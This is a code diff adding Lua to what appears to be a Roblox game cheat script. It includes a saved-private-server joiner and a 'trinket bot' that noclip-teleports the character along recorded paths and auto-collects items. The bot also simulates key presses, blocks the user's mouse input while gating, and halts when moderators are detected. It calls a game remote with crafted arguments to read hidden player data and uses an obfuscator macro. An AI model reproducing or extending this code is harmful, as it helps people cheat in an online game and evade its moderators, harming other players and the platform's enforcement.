+                                            original_days.one.connection:Disconnect()
+                                            original_days.one.connection = nil
+                                        end
+                                    end
+                                end
+                            end
                         end
                     end
                 end
@@ -7550,7 +11981,6 @@ if game.PlaceId == 100010170789226 then
                     char_custom_enabled.accessories = false
 
                     if plr.Character then
-                        -- Clear custom accessories from current_accessories table
                         for _, acc in ipairs(current_accessories) do
                             if acc and acc.Parent then
                                 acc:Destroy()
@@ -7558,7 +11988,6 @@ if game.PlaceId == 100010170789226 then
                         end
                         current_accessories = {}
 
-                        -- Also destroy ALL accessories in the character (including base ones)
                         for _, child in ipairs(plr.Character:GetChildren()) do
                             if child:IsA("Accessory") then
                                 child:Destroy()
@@ -7779,7 +12208,6584 @@ if game.PlaceId == 100010170789226 then
             })
         end
 
-        do -- Macros
+        do
+            local group_ps = Tabs.Misc:AddRightGroupbox("PS Servers")
+
+            local ps_file = "HYDROXIDE/private_servers.json"
+            local http_service = Services.HttpService
+
+            local function load_servers()
+                if not isfile(ps_file) then
+                    return {"1967beef", "ffdc35ae", "555985b2"}
+                end
+                local success, result = pcall(function()
+                    return http_service:JSONDecode(readfile(ps_file))
+                end)
+                if success and type(result) == "table" then
+                    return result
+                end
+                return {"1967beef", "ffdc35ae", "555985b2"}
+            end
+
+            local function save_servers(servers)
+                local success = pcall(function()
+                    writefile(ps_file, http_service:JSONEncode(servers))
+                end)
+                return success
+            end
+
+            local server_ids = load_servers()
+
+            local function join_server(server_id)
+                if cs:HasTag(plr.Character, "Danger") and not (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value) then
+                    repeat
+                        rs.Heartbeat:Wait()
+                    until not cs:HasTag(plr.Character, "Danger") or (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value)
+                end
+                rps.Requests.JoinPrivateServer:FireServer(server_id)
+            end
+
+            local function refresh_dropdown()
+                server_ids = load_servers()
+                if Options.PrivateServerDropdown then
+                    Options.PrivateServerDropdown:SetValues(server_ids)
+                    if #server_ids > 0 then
+                        Options.PrivateServerDropdown:SetValue(server_ids[1])
+                    end
+                end
+            end
+
+            group_ps:AddDropdown("PrivateServerDropdown", {
+                Text = "Saved Servers",
+                Values = server_ids,
+                Default = #server_ids > 0 and server_ids[1] or nil,
+                Multi = false,
+                Callback = function(value) end
+            })
+
+            group_ps:AddButton({
+                Text = "Copy Code",
+                Func = function()
+                    local server_id = Options.PrivateServerDropdown.Value
+                    if server_id and server_id ~= "" then
+                        if setclipboard then
+                            setclipboard(server_id)
+                            library:Notify("Copied code: " .. server_id, 3)
+                        else
+                            library:Notify("setclipboard not available", 3)
+                        end
+                    else
+                        library:Notify("Please select a server", 3)
+                    end
+                end
+            })
+
+            group_ps:AddButton({
+                Text = "Join Selected Server",
+                DoubleClick = true,
+                Func = function()
+                    local server_id = Options.PrivateServerDropdown.Value
+                    if server_id and server_id ~= "" then
+                        join_server(server_id)
+                        library:Notify("Joining private server: " .. server_id, 3)
+                    else
+                        library:Notify("Please select a server", 3)
+                    end
+                end
+            })
+
+            group_ps:AddDivider()
+
+            group_ps:AddInput("CustomPrivateServer", {
+                Text = "Server Code",
+                Placeholder = "Enter server code...",
+                ClearTextOnFocus = false,
+            })
+
+            group_ps:AddButton({
+                Text = "Join Server Code",
+                DoubleClick = true,
+                Func = function()
+                    local server_id = Options.CustomPrivateServer.Value
+                    if server_id and server_id ~= "" then
+                        join_server(server_id)
+                        library:Notify("Joining private server: " .. server_id, 3)
+                    else
+                        library:Notify("Please enter a valid server ID", 3)
+                    end
+                end
+            })
+
+            group_ps:AddButton({
+                Text = "Add to Saved Servers",
+                Func = function()
+                    local server_id = Options.CustomPrivateServer.Value
+                    if server_id and server_id ~= "" then
+                        for _, id in ipairs(server_ids) do
+                            if id == server_id then
+                                library:Notify("Server already in list", 3)
+                                return
+                            end
+                        end
+                        table.insert(server_ids, server_id)
+                        save_servers(server_ids)
+                        refresh_dropdown()
+                        library:Notify("Added server: " .. server_id, 3)
+                    else
+                        library:Notify("Please enter a server ID", 3)
+                    end
+                end
+            })
+
+            group_ps:AddButton({
+                Text = "Delete Selected Server",
+                Func = function()
+                    local server_id = Options.PrivateServerDropdown.Value
+                    if server_id and server_id ~= "" then
+                        for i, id in ipairs(server_ids) do
+                            if id == server_id then
+                                table.remove(server_ids, i)
+                                save_servers(server_ids)
+                                refresh_dropdown()
+                                library:Notify("Deleted server: " .. server_id, 3)
+                                return
+                            end
+                        end
+                        library:Notify("Server not found in list", 3)
+                    else
+                        library:Notify("Please select a server", 3)
+                    end
+                end
+            })
+        end
+
+        do
+            local trinket_bot = {
+                path_points = {},
+                point_visualizations = {},
+                visualize_enabled = false,
+                path_running = false,
+                current_path_name = "",
+                session_loot = {},
+                session_start_time = 0,
+                moderator_detected = false,
+                pending_artifact_logs = {},
+                pending_pickup_ids = {}
+            }
+
+            cheat_client.trinket_bot = trinket_bot
+
+            local visited_positions = {}
+            local collected_trinket_ids = {}
+            local COLLECTED_IDS_MAX_SIZE = 500
+            local pending_pickup_ids = trinket_bot.pending_pickup_ids
+            local active_tween_data = {tween = nil, connection = nil}
+
+            local function mark_trinket_collected(trinket_id_value)
+                local count = 0
+                for _ in pairs(collected_trinket_ids) do
+                    count = count + 1
+                    if count > COLLECTED_IDS_MAX_SIZE then
+                        collected_trinket_ids = {}
+                        break
+                    end
+                end
+                collected_trinket_ids[trinket_id_value] = true
+            end
+
+            local PENDING_PICKUP_MAX_SIZE = 100
+            local function queue_pending_pickup(trinket_id_value)
+                table.insert(pending_pickup_ids, trinket_id_value)
+                while #pending_pickup_ids > PENDING_PICKUP_MAX_SIZE do
+                    table.remove(pending_pickup_ids, 1)
+                end
+            end
+
+            local kick_debounce = false
+            local kick_after_path = false
+            local kick_trinket_name = ""
+
+            local proximity_warnings = {}
+            local mana_initialized = false
+            local emergency_gate_requested = nil
+            local current_gate_section = 0
+            local player_encounters = {}
+            local emergency_resume_mode = false
+            local INPUT_BLOCKED = false
+
+            utility:Connection(plrs.PlayerRemoving, function(player)
+                player_encounters[player.UserId] = nil
+                proximity_warnings[player.UserId] = nil
+            end)
+
+            local function Get(value)
+                local success, result = pcall(function()
+                    return rps.Requests.Get:InvokeServer(utf8.char(65532) .. "\240\159\152\131", value)[value]
+                end)
+                return success and result or nil
+            end
+
+            local function blockInputs()
+                INPUT_BLOCKED = true
+                cas:BindAction(
+                    "BlockMouse",
+                    function(actionName, inputState, inputObject)
+                        if INPUT_BLOCKED then
+                            return Enum.ContextActionResult.Sink
+                        end
+                    end,
+                    false,
+                    Enum.UserInputType.MouseButton1,
+                    Enum.UserInputType.MouseButton2
+                )
+            end
+
+            local function unblockInputs()
+                INPUT_BLOCKED = false
+                cas:UnbindAction("BlockMouse")
+            end
+
+            local function already_visited_position(pos)
+                for _, visited_pos in ipairs(visited_positions) do
+                    if (pos - visited_pos).Magnitude < 5 then
+                        return true
+                    end
+                end
+                return false
+            end
+
+            local function restore_bot_state()
+                if plr and plr.Character then
+                    local character = plr.Character
+                    local huma = FindFirstChildOfClass(character, "Humanoid")
+
+                    for _, part in ipairs(character:GetDescendants()) do
+                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                            if part.Name == "Head" or part.Name == "Torso" then
+                                part.CanCollide = true
+                            else
+                                part.CanCollide = false
+                            end
+                        end
+                    end
+
+                    if huma then
+                        huma:SetStateEnabled(5, true)
+                        huma:ChangeState(5)
+                    end
+
+                    local rootPart = FindFirstChild(character, "HumanoidRootPart")
+                    if rootPart then
+                        rootPart.Anchored = false
+                    end
+                end
+            end
+
+            local function create_point_visualization(position, is_wait_point, is_gate_point)
+                local sphere = Instance.new("Part")
+                sphere.Shape = Enum.PartType.Ball
+                sphere.Size = Vector3.new(2, 2, 2)
+                sphere.Position = position
+                sphere.Anchored = true
+                sphere.CanCollide = false
+                sphere.Material = Enum.Material.Neon
+
+                if is_gate_point then
+                    sphere.Color = Color3.fromRGB(255, 105, 180)
+                elseif is_wait_point then
+                    sphere.Color = Color3.fromRGB(0, 100, 255)
+                else
+                    sphere.Color = Color3.fromRGB(255, 255, 255)
+                end
+
+                sphere.Transparency = 0.3
+                sphere.Name = "2holla"
+                sphere.Parent = workspace.Thrown
+                return sphere
+            end
+
+            local function update_visualizations()
+                for _, part in ipairs(trinket_bot.point_visualizations) do
+                    if part and part.Parent then
+                        pcall(function() part:Destroy() end)
+                    end
+                end
+                trinket_bot.point_visualizations = {}
+
+                if trinket_bot.visualize_enabled then
+                    local previous_sphere = nil
+
+                    for i, point in ipairs(trinket_bot.path_points) do
+                        local is_gate = point.is_gate_point or false
+                        local sphere = create_point_visualization(point.position, point.wait_for_trinket, is_gate)
+                        table.insert(trinket_bot.point_visualizations, sphere)
+
+                        local billboard = Instance.new("BillboardGui")
+                        billboard.Size = is_gate and UDim2.new(0, 100, 0, 50) or UDim2.new(0, 50, 0, 50)
+                        billboard.AlwaysOnTop = true
+                        billboard.Adornee = sphere
+                        billboard.Parent = hidden_folder
+                        table.insert(trinket_bot.point_visualizations, billboard)
+
+                        local label = Instance.new("TextLabel")
+                        label.Size = UDim2.new(1, 0, 1, 0)
+                        label.BackgroundTransparency = 1
+
+                        if is_gate then
+                            label.Text = "G: " .. (point.gate_location or "???")
+                            label.TextColor3 = Color3.fromRGB(255, 105, 180)
+                        else
+                            label.Text = tostring(i)
+                            label.TextColor3 = point.wait_for_trinket and Color3.fromRGB(100, 150, 255) or Color3.new(1, 1, 1)
+                        end
+
+                        label.TextScaled = true
+                        label.Font = Enum.Font.SourceSansBold
+                        label.Parent = billboard
+
+                        if previous_sphere then
+                            local attachment0 = Instance.new("Attachment")
+                            attachment0.Parent = previous_sphere
+
+                            local attachment1 = Instance.new("Attachment")
+                            attachment1.Parent = sphere
+
+                            local beam = Instance.new("Beam")
+                            beam.Attachment0 = attachment0
+                            beam.Attachment1 = attachment1
+                            beam.FaceCamera = true
+                            beam.Width0 = 0.3
+                            beam.Width1 = 0.3
+                            beam.Color = ColorSequence.new(Color3.new(1, 1, 1))
+                            beam.Transparency = NumberSequence.new(0.3)
+                            beam.Parent = sphere
+
+                            table.insert(trinket_bot.point_visualizations, beam)
+                        end
+
+                        previous_sphere = sphere
+                    end
+                end
+            end
+
+            local loot_tracking_connection = nil
+            local quantity_connections = {}
+            local initial_quantities = {}
+            local pd_char_connection = nil
+            local auto_drop_char_connection = nil
+            local auto_drop_backpack_connection = nil
+
+            utility:Connection(plr.CharacterRemoving, function()
+                for _, conn in ipairs(quantity_connections) do
+                    pcall(function() conn:Disconnect() end)
+                end
+                quantity_connections = {}
+                initial_quantities = {}
+            end)
+
+            local function log_pickup(item_name, quantity)
+                quantity = quantity or 1
+                if trinket_bot.session_loot[item_name] then
+                    trinket_bot.session_loot[item_name] = trinket_bot.session_loot[item_name] + quantity
+                else
+                    trinket_bot.session_loot[item_name] = quantity
+                end
+
+                if trinket_bot.pending_artifact_logs and #trinket_bot.pending_artifact_logs > 0 then
+                    local pickup_id = table.remove(pending_pickup_ids, 1)
+
+                    if pickup_id and pickup_id ~= "" then
+                        local removed = false
+                        for i = 1, #trinket_bot.pending_artifact_logs do
+                            if removed then break end
+                            local log_entry = trinket_bot.pending_artifact_logs[i]
+                            if log_entry.artifact_ids then
+                                for j = #log_entry.artifact_ids, 1, -1 do
+                                    if log_entry.artifact_ids[j] == pickup_id then
+                                        table.remove(log_entry.artifact_ids, j)
+                                        table.remove(log_entry.artifact_names, j)
+                                        library:Notify(string.format("Removed %s from artifact queue by ID (picked up)", item_name))
+                                        removed = true
+                                        break
+                                    end
+                                end
+                                if log_entry.artifact_names and #log_entry.artifact_names == 0 then
+                                    table.remove(trinket_bot.pending_artifact_logs, i)
+                                end
+                            end
+                        end
+                    else
+                        local removed = false
+                        for i = 1, #trinket_bot.pending_artifact_logs do
+                            if removed then break end
+                            local log_entry = trinket_bot.pending_artifact_logs[i]
+                            if log_entry.artifact_names then
+                                for j = #log_entry.artifact_names, 1, -1 do
+                                    if log_entry.artifact_names[j] == item_name then
+                                        table.remove(log_entry.artifact_names, j)
+                                        if log_entry.artifact_ids then
+                                            table.remove(log_entry.artifact_ids, j)
+                                        end
+                                        library:Notify(string.format("Removed %s from artifact queue (picked up)", item_name))
+                                        removed = true
+                                        break
+                                    end
+                                end
+                                if #log_entry.artifact_names == 0 then
+                                    table.remove(trinket_bot.pending_artifact_logs, i)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            local function start_loot_tracking()
+                trinket_bot.session_loot = {}
+                trinket_bot.session_start_time = os.clock()
+                initial_quantities = {}
+
+                if loot_tracking_connection then
+                    loot_tracking_connection:Disconnect()
+                end
+                for _, conn in ipairs(quantity_connections) do
+                    pcall(function() conn:Disconnect() end)
+                end
+                quantity_connections = {}
+
+                if plr.Backpack then
+                    for _, item in pairs(plr.Backpack:GetDescendants()) do
+                        if item:IsA("IntValue") and item.Name == "Quantity" and item.Parent:IsA("Tool") then
+                            local tool_name = item.Parent.Name
+                            initial_quantities[tool_name] = item.Value
+
+                            local conn = utility:Connection(item:GetPropertyChangedSignal("Value"), function()
+                                if not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                                    return
+                                end
+                                local baseline = initial_quantities[tool_name] or 0
+                                local current_session = trinket_bot.session_loot[tool_name] or 0
+                                local new_amount = item.Value - baseline - current_session
+                                if new_amount > 0 then
+                                    log_pickup(tool_name, new_amount)
+                                end
+                            end)
+                            table.insert(quantity_connections, conn)
+                        end
+                    end
+                end
+
+                if not plr.Backpack then
+                    warn("[Loot Tracking] Backpack not found, skipping ChildAdded connection")
+                    return
+                end
+
+                loot_tracking_connection = utility:Connection(plr.Backpack.ChildAdded, function(child)
+                    if not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                        return
+                    end
+
+                    if not child:IsA("Tool") then return end
+
+                    task.wait(0.5)
+                    if FindFirstChild(child, "SilverValue") then
+                        local tool_name = child.Name
+
+                        if not initial_quantities[tool_name] then
+                            initial_quantities[tool_name] = 0
+                        end
+
+                        log_pickup(tool_name)
+                        task.wait(1)
+
+                        local quantity_value = FindFirstChild(child, "Quantity")
+                        if quantity_value and quantity_value:IsA("IntValue") then
+                            local conn = utility:Connection(quantity_value:GetPropertyChangedSignal("Value"), function()
+                                if not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                                    return
+                                end
+                                local baseline = initial_quantities[tool_name] or 0
+                                local current_session = trinket_bot.session_loot[tool_name] or 0
+                                local new_amount = quantity_value.Value - baseline - current_session
+                                if new_amount > 0 then
+                                    log_pickup(tool_name, new_amount)
+                                end
+                            end)
+                            table.insert(quantity_connections, conn)
+                        end
+                    end
+                end)
+            end
+
+            local function get_inventory_value()
+                local inventory_value = 0
+
+                if not plr.Backpack then return 0 end
+                local backpack_children = plr.Backpack:GetChildren()
+
+                for index = 1, #backpack_children do
+                    local backpack_child = backpack_children[index]
+                    local silver_value = FindFirstChild(backpack_child, "SilverValue")
+
+                    if silver_value then
+                        inventory_value = inventory_value + silver_value.Value
+                    end
+                end
+
+                return inventory_value
+            end
+
+            local function format_loot_summary()
+                local elapsed_time = os.clock() - trinket_bot.session_start_time
+                local hours = math.floor(elapsed_time / 3600)
+                local minutes = math.floor((elapsed_time % 3600) / 60)
+                local seconds = math.floor(elapsed_time % 60)
+
+                local summary = string.format("**Inventory Value**: %d\n**Session: %dh %dm %ds**\n", get_inventory_value(), hours, minutes, seconds)
+                if not trinket_bot.session_loot or not next(trinket_bot.session_loot) then
+                    summary = summary .. "No items collected"
+                    return summary
+                end
+
+                local items = {}
+                for item_name, count in pairs(trinket_bot.session_loot) do
+                    table.insert(items, {name = item_name, count = count})
+                end
+
+                table.sort(items, function(a, b)
+                    return a.count > b.count
+                end)
+
+                for _, item in ipairs(items) do
+                    summary = summary .. string.format("%dx %s\n", item.count, item.name)
+                end
+
+                return summary
+            end
+
+            local function SmoothTeleport(target, is_trinket_teleport)
+                is_trinket_teleport = is_trinket_teleport or false
+
+                if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    return
+                end
+
+                if shared.is_unloading then
+                    return
+                end
+
+                local root = plr.Character.HumanoidRootPart
+                local targetPosition
+
+                if typeof(target) == "CFrame" then
+                    targetPosition = target.Position
+                elseif typeof(target) == "Vector3" then
+                    targetPosition = target
+                elseif typeof(target) == "Instance" and target:IsA("BasePart") then
+                    targetPosition = target.Position
+                else
+                    warn("Invalid target for SmoothTeleport:", target)
+                    return
+                end
+
+                local current_position = root.Position
+                local distance = (targetPosition - current_position).Magnitude
+                if distance > 1500 then
+                    library:Notify(string.format("!! Attempted teleport of %.0f studs! Stopping path... (if this is a bug DM work at a pizza place bot)", distance))
+                    trinket_bot.path_running = false
+                    return
+                end
+
+                local character = plr.Character
+                if character then
+                    local humanoid = FindFirstChildOfClass(character, "Humanoid")
+                    if humanoid then
+                        humanoid:SetStateEnabled(5, false)
+                        humanoid:ChangeState(3)
+                    end
+                end
+
+                local connection
+                connection = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                    if shared.is_unloading then
+                        if connection then
+                            connection:Disconnect()
+                            connection = nil
+                            active_tween_data.connection = nil
+                        end
+                        return
+                    end
+
+                    if plr.Character then
+                        for _, v in pairs(plr.Character:GetDescendants()) do
+                            if v:IsA("BasePart") then
+                                v.Velocity = Vector3.new()
+                                v.CanCollide = false
+                            end
+                        end
+                    end
+                end))
+
+                local distance = (root.Position - targetPosition).Magnitude
+                local speed = Options.TrinketBotSpeed and Options.TrinketBotSpeed.Value or 100
+                local time = distance / speed
+
+                local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+                local tween = ts:Create(root, tweenInfo, {CFrame = CFrame.new(targetPosition)})
+
+                active_tween_data.tween = tween
+                active_tween_data.connection = connection
+
+                tween:Play()
+
+                local completed = false
+                local unload_connection
+                unload_connection = utility:Connection(tween.Completed, function()
+                    completed = true
+                    if unload_connection then
+                        unload_connection:Disconnect()
+                    end
+                end)
+
+                while not completed and not shared.is_unloading and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                    task.wait()
+                end
+
+                if shared.is_unloading or not trinket_bot.path_running or trinket_bot.moderator_detected then
+                    tween:Cancel()
+                end
+
+                if not shared.is_unloading and is_trinket_teleport then
+                    task.wait(0.25)
+                end
+
+                if character then
+                    local humanoid = FindFirstChildOfClass(character, "Humanoid")
+                    if humanoid then
+                        humanoid:SetStateEnabled(5, true)
+                        humanoid:ChangeState(5)
+                    end
+
+                    if shared.is_unloading then
+                        for _, part in ipairs(character:GetDescendants()) do
+                            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                                if part.Name == "Head" or part.Name == "Torso" then
+                                    part.CanCollide = true
+                                else
+                                    part.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                end
+
+                if connection then
+                    connection:Disconnect()
+                end
+
+                active_tween_data.tween = nil
+                active_tween_data.connection = nil
+            end
+
+            local function getPing()
+                local success, ping = pcall(function()
+                    return Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
+                end)
+                return success and ping or 0
+            end
+
+            local function IsPlayerNearPosition(position, radius)
+                radius = radius or 65
+                for _, other_player in next, plrs:GetPlayers() do
+                    if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                        local distance = (other_player.Character.HumanoidRootPart.Position - position).Magnitude
+                        if distance <= radius then
+                            return true, other_player.Name
+                        end
+                    end
+                end
+                return false, nil
+            end
+
+            local function detectTrinketArea(trinket_position)
+                if not FindFirstChild(ws, "AreaMarkers") then return "None" end
+
+                local LocationName = "None"
+                local LocationNumSq = math.huge
+                local Area = ws.AreaMarkers
+
+                for i, v in pairs(Area:GetChildren()) do
+                    local diff = trinket_position - v.Position
+                    local distSq = diff.X * diff.X + diff.Y * diff.Y + diff.Z * diff.Z
+                    if distSq < LocationNumSq then
+                        LocationName = v.Name
+                        LocationNumSq = distSq
+                    end
+                end
+
+                return LocationName
+            end
+
+            local function Gate(where, expected_destination)
+                if not trinket_bot.path_running then
+                    return false
+                end
+
+                if currently_dropping then
+                    library:Notify("Waiting for item drop to complete before gating...")
+                    while currently_dropping and trinket_bot.path_running do
+                        task.wait(0.1)
+                    end
+
+                    local character = plr.Character
+                    if character and cs:HasTag(character, "Danger") then
+                        library:Notify("Item dropped - waiting for Danger to clear before gating...")
+                        local danger_cleared = false
+                        local danger_conn
+                        danger_conn = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                            if instance == character then
+                                danger_cleared = true
+                                if danger_conn then danger_conn:Disconnect() end
+                            end
+                        end)
+
+                        while not danger_cleared and trinket_bot.path_running do
+                            task.wait(0.1)
+                        end
+                        if danger_conn then danger_conn:Disconnect() end
+
+                        if danger_cleared then
+                            library:Notify("Danger cleared after item drop - proceeding with gate")
+                        end
+                    end
+                end
+
+                if active_tween_data.tween then
+                    active_tween_data.tween:Cancel()
+                    active_tween_data.tween = nil
+                end
+                if active_tween_data.connection then
+                    active_tween_data.connection:Disconnect()
+                    active_tween_data.connection = nil
+                end
+
+                if plr.Character then
+                    local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                    if humanoid then
+                        humanoid:SetStateEnabled(5, true)
+                        humanoid:ChangeState(5)
+                    end
+                end
+
+                if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    warn("Character not found")
+                    return false
+                end
+
+                local gateTool = FindFirstChild(plr.Character, "Gate") or FindFirstChild(plr.Backpack, "Gate")
+                if not gateTool then
+                    warn("Gate tool not found")
+                    return false
+                end
+
+                if FindFirstChild(plr.Backpack, "Gate") then
+                    plr.Character.Humanoid:EquipTool(plr.Backpack["Gate"])
+                    task.wait(0.3)
+                end
+
+                local CollectionService = Services.CollectionService
+                if CollectionService:HasTag(plr.Character, "SnapCool") then
+                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                    if cs:HasTag(plr.Character, "Danger") then
+                        if stay_in_server then
+                            library:Notify("SnapCool + Danger active but staying in server - waiting for both to clear...")
+                            while (CollectionService:HasTag(plr.Character, "SnapCool") or cs:HasTag(plr.Character, "Danger")) and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                task.wait(0.1)
+                            end
+                            library:Notify("SnapCool and Danger cleared - proceeding with gate")
+                        else
+                            library:Notify("SnapCool active while in Danger - cannot gate safely!")
+                            return false
+                        end
+                    else
+                        library:Notify("Waiting for SnapCool to expire before gating...")
+                        local snap_timeout = 0
+                        local max_timeout = stay_in_server and 999999 or 100
+
+                        while CollectionService:HasTag(plr.Character, "SnapCool") and snap_timeout < max_timeout and not emergency_gate_requested do
+                            task.wait(0.1)
+                            snap_timeout = snap_timeout + 1
+                            if not trinket_bot.path_running then
+                                return false
+                            end
+
+                            if cs:HasTag(plr.Character, "Danger") then
+                                if stay_in_server then
+                                    library:Notify("Danger appeared while waiting for SnapCool - waiting for both to clear...")
+                                    while (CollectionService:HasTag(plr.Character, "SnapCool") or cs:HasTag(plr.Character, "Danger")) and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                        task.wait(0.1)
+                                    end
+                                    library:Notify("SnapCool and Danger cleared - proceeding with gate")
+                                    break
+                                else
+                                    library:Notify("Entered Danger while waiting for SnapCool - aborting gate!")
+                                    return false
+                                end
+                            end
+                        end
+
+                        if snap_timeout >= max_timeout and not stay_in_server then
+                            library:Notify("SnapCool timeout - gate aborted")
+                            return false
+                        end
+
+                        if not CollectionService:HasTag(plr.Character, "SnapCool") and not cs:HasTag(plr.Character, "Danger") then
+                            library:Notify("SnapCool expired - proceeding with gate")
+                        end
+                    end
+                end
+
+                local character = plr.Character
+                local mana = FindFirstChild(character, "Mana")
+                if not mana then
+                    warn("Mana not found")
+                    return false
+                end
+
+                if character and cs:HasTag(character, "Danger") then
+                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                    local has_player_nearby = false
+                    local closest_player_name = ""
+                    local closest_player_distance = math.huge
+
+                    if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        local current_pos = plr.Character.HumanoidRootPart.Position
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                local distance = (other_player.Character.HumanoidRootPart.Position - current_pos).Magnitude
+
+                                if distance <= 250 then
+                                    has_player_nearby = true
+                                    if distance < closest_player_distance then
+                                        closest_player_distance = distance
+                                        closest_player_name = other_player.Name
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    if has_player_nearby then
+                        library:Notify(string.format("In danger with %s within %.0f studs - gating away despite danger", closest_player_name, closest_player_distance))
+                    elseif stay_in_server then
+                        library:Notify("In danger but staying in server - waiting for danger to clear")
+                        repeat
+                            task.wait(0.1)
+                        until not cs:HasTag(character, "Danger") or trinket_bot.moderator_detected
+                        if trinket_bot.moderator_detected then
+                            return false
+                        end
+                        library:Notify("Danger cleared - continuing gate execution")
+                    else
+                        library:Notify("In danger but no players within 250 studs (likely from item drop or mobs??) - waiting for danger to clear")
+                        repeat
+                            task.wait(0.1)
+                        until not cs:HasTag(character, "Danger") or trinket_bot.moderator_detected
+                        if trinket_bot.moderator_detected then
+                            return false
+                        end
+                        library:Notify("Danger cleared - continuing gate execution")
+                    end
+                end
+
+                if not mana_initialized and vim then
+                    task.wait(0.3)
+                    local charge_key = Enum.KeyCode.G
+                    vim:SendKeyEvent(true, charge_key, false, game)
+                    task.wait(0.15)
+                    vim:SendKeyEvent(false, charge_key, false, game)
+                    task.wait(0.2)
+                    mana_initialized = true
+                end
+
+                blockInputs()
+                task.delay(5, function()
+                    if INPUT_BLOCKED then
+                        unblockInputs()
+                    end
+                end)
+
+                local is_azael = Get and Get("Race") == "Azael"
+                local has_philosophers_stone = false
+                if FindFirstChild(plr.Character, "Artifacts") then
+                    local artifacts = plr.Character.Artifacts
+                    if FindFirstChild(artifacts, "PhilosophersStone") then
+                        has_philosophers_stone = true
+                    end
+                end
+
+                local in_danger = character and cs:HasTag(character, "Danger")
+                if is_azael and not in_danger then
+                    if mana.Value <= 15 then
+                        utility:charge_mana_until(15)
+                    end
+                elseif has_philosophers_stone then
+                    if mana.Value < 60 then
+                        utility:charge_mana_until(60)
+                    end
+                else
+                    local ping = getPing()
+                    local ping_adjustment = ping / 900
+
+                    local base_target = 79
+                    local adjusted_target = base_target - (ping_adjustment * 50)
+                    adjusted_target = math.clamp(adjusted_target, 75, 83)
+
+                    if mana.Value > 83 then
+                        utility:decharge_mana()
+                        while mana.Value > 83 and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                            task.wait(0.05)
+                        end
+                    end
+
+                    if mana.Value < adjusted_target then
+                        utility:charge_mana_until(adjusted_target)
+                    end
+                end
+
+                task.wait(0.05)
+                utility:RightClick()
+                task.wait(0.8)
+
+                if FindFirstChild(gateTool, "PsuedoChatted") then
+                    gateTool.PsuedoChatted:FireServer(where)
+                end
+
+                if INPUT_BLOCKED then
+                    unblockInputs()
+                end
+
+                local post_gate_wait_start = tick()
+                while tick() - post_gate_wait_start < 2.5 and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                    if FindFirstChild(character, "NoFall") then
+                        task.wait(1.5)
+
+                        if character and FindFirstChild(character, "HumanoidRootPart") then
+                            local post_gate_position = character.HumanoidRootPart.Position
+
+                            if expected_destination then
+                                local distance_to_destination = (post_gate_position - expected_destination).Magnitude
+
+                                if distance_to_destination > 700 then
+                                    library:Notify(string.format("BACKFIRE detected (%.0f studs from expected destination)", distance_to_destination))
+                                    return false
+                                end
+
+                                library:Notify(string.format("Successfully gated to %s (%.0f studs from destination)", where, distance_to_destination))
+                                return true
+                            end
+
+                            library:Notify(string.format("Successfully gated to %s", where))
+                            return true
+                        else
+                            warn("Character lost during gate verification")
+                            return false
+                        end
+                    end
+                    task.wait(0.1)
+                end
+
+                warn("Gate teleportation failed: NoFall not found after 2.5s")
+                return false
+            end
+
+            local function CheckForTrinkets()
+                local root = plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart")
+                if not root then return end
+
+                local trinkets = {}
+                local ignore_ice = not (Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value)
+                local ignore_scrolls = not (Toggles.PickupScrolls and Toggles.PickupScrolls.Value)
+                local selected_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {}
+                local pickup_trinkets = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value
+                local pickup_event_items = Toggles.PickupEventItems and Toggles.PickupEventItems.Value
+                local min_distance = 350
+
+                for _, object in next, ws:GetChildren() do
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        local trinketName, trinketColor, trinketZIndex = cheat_client:identify_trinket(object)
+                        local should_pickup = true
+
+                        if ignore_ice and trinketName == "Ice Essence" then
+                            should_pickup = false
+                        elseif trinketName == "Scroll" then
+                            should_pickup = not ignore_scrolls
+                        else
+                            local is_mythic = trinketColor == cheat_client.trinket_colors.mythic.Color
+                            local is_artifact = trinketColor == cheat_client.trinket_colors.artifact.Color
+                            local is_event = trinketColor == cheat_client.trinket_colors.event.Color
+                            local is_common = trinketColor == cheat_client.trinket_colors.common.Color
+                            local is_rare = trinketColor == cheat_client.trinket_colors.rare.Color
+
+                            if is_mythic or is_artifact then
+                                should_pickup = selected_mythics_artifacts[trinketName] == true
+                            elseif is_event then
+                                should_pickup = pickup_event_items
+                            elseif is_common or is_rare then
+                                should_pickup = pickup_trinkets
+                            end
+                        end
+
+                        if should_pickup then
